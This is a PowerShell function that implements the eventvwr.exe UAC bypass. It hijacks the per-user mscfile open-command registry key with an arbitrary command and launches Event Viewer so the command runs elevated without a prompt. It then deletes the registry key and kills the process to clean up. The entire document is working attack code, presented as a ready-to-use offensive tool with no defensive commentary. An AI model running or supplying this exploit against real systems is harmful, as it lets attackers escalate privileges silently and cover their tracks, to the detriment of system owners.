function Invoke-EventVwrBypass {


    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )

    $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
    
    if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
        New-Item $mscCommandPath -Force |
            New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
    }else{
        Write-Verbose "Key already exists, consider using -Force"
        exit
    }

    if (Test-Path $mscCommandPath) {
        Write-Verbose "Created registry entries to hijack the msc extension"
    }else{
        Write-Warning "Failed to create registry key, exiting"
        exit
    }
    

    $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'

    
    if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
        $Process = Start-Process -FilePath $EventvwrPath -PassThru
        Write-Verbose "Started eventvwr.exe"
    }

    
    Write-Verbose "Sleeping 5 seconds to trigger payload"
    if (-not $PSBoundParameters['WhatIf']) {
        Start-Sleep -Seconds 5
    }

    $mscfilePath = "HKCU:\Software\Classes\mscfile"

    if (Test-Path $mscfilePath) {
        
        Remove-Item $mscfilePath -Recurse -Force
        Write-Verbose "Removed registry entries"
    }

    if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
        Stop-Process -Id $Process.Id
        Write-Verbose "Killed running eventvwr process"
    }
}
